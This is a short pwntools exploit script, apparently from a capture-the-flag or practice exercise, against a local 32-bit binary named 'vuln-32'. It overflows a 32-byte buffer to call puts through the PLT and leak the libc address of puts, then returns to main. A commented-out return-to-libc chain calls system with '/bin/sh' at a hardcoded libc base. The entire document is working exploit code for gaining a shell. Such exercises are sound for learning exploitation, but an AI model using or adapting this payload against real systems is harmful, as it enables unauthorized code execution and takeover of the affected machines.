from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc
libc.address = 0xf7c00000

log.info(p.clean())
# p.sendline(flat(
#     b'x'*32,
#     libc.sym['system'],
#     0x0,
#     next(libc.search(b'/bin/sh'))
# ))
# p.interactive()
p.sendline(flat(
    b'x'*32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
))
log.info(u32(p.recv(4)))
